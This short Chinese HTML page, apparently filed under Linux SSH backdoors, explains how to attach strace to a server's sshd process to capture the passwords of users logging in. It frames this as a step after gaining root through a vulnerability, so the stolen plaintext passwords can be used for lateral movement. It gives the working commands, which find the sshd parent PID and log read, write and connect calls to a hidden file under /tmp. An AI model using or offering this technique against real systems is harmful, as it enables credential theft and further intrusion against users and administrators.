	<body>
		<h1 class="csAD577193">
			<a name="strace监听ssh来源流量"><span class="csDE05BCC">strace</span><span class="csECDA2D3">监听</span><span class="csDE05BCC">ssh</span><span class="csECDA2D3">来源流量</span></a></h1>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取</span><span class="cs8926E06">root</span><span class="cs9C1B1871">权限，但是不知道明文密码在横向扩展中可以使用。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用</span><span class="cs8926E06">strace</span><span class="cs9C1B1871">来监听登陆本地的</span><span class="cs8926E06">sshd</span><span class="cs9C1B1871">流量。</span></p><p class="cs3A447A38"><span class="cs9FB05234">ps -ef | grep sshd #</span><span class="cs7FFD2630">父进程</span><span class="cs9FB05234">PID</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">strace -f -p 12617 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/SSH后门/strace%e7%9b%91%e5%90%acssh%e6%9d%a5%e6%ba%90%e6%b5%81%e9%87%8f%20_files/image0.png" width="560" height="212" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
